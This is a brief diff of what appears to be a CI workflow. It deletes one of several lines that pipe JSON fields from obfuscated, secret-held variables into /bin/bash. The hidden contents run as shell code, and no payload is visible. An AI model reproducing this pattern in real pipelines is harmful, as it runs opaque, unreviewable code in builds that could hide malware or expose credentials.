@@ -18,7 +18,6 @@ jobs:
           v4085: ${{ secrets.v4085 }}
         run: |
           printf '%s' "$v4085" | jq -r .zz1777 | /bin/bash
-          printf '%s' "$l3162" | jq -r .rhvb18226 | /bin/bash
           printf '%s' "$xky0730" | jq -r .k6414 | /bin/bash
           printf '%s' "$uovrp3" | jq -r .n98 | /bin/bash
 
